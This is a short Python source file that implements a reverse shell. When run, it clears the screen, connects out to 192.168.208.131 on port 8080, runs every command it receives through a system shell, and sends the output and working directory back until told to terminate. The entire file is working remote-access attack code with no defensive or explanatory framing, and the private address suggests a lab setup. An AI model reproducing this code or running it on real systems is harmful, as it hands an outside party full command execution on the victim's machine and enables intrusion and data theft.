import socket
import subprocess
import os

os.system("clear || cls")
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(('192.168.208.131', 8080))
    ter = 'terminate'
    while True:
        command =  s.recv(1024)
        if len(command) > 0:
            if ter.encode("utf-8") in command:
                s.close()
                break 
            else:
                cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> ')) 

def main ():
    connect()

main()



